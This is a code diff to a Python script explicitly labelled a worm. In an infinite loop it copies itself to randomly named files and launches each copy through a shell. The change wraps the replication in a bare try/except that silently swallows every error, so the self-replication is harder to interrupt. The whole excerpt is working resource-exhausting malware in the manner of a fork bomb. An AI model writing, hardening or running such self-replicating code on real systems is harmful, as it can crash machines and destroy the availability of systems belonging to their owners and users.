@@ -13,7 +13,10 @@ seed()
 #     pass
 
 while True:
-    # Create a version of itself
-    file_name = "worm"+str(randint(2, 5000))+".py"
-    copy(__file__, file_name)
-    Popen((file_name), shell=True)
+    try:
+        # Create a version of itself
+        file_name = "worm"+str(randint(2, 5000))+".py"
+        copy(__file__, file_name)
+        Popen((file_name), shell=True)
+    except:
+        pass
